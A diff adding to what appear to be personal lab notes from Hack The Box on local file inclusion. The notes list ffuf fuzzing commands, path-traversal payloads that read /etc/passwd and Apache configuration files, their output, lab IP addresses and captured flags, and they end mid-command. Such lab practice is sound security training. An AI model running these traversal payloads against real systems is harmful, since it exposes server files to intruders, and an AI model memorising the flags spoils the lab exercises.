@@ -96,3 +96,45 @@ http://83.136.253.251:46020/index.php?language=/var/lib/php/sessions/sess_7a3mr9
 /var/www/html
 
 HTB{1095_5#0u1d_n3v3r_63_3xp053d}
+
+##
+- Fuzzing Parameters
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+- LFI wordlists
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
+...SNIP...
+../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+
+- Server Logs/Configurations
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.255.150:40951/index.php?FUZZ=value' -fs 2287 | grep -v 571
+view
+
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.255.150:40951/index.php?view=FUZZ' -fs 2287 | grep -v 515
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?view=../../../../../../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 2287 | grep -v 515
+/var/www/html/ 
+
+HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
+
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?view=../../../../../../../../../../../../../../../../../../../../../../FUZZ/index.php -fs 2287 | grep -v 515
+
+../../../../../../../../../../../../../../../../../../../../../../etc/flag.txt
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u http://83.136.255.150:40951/index.php?
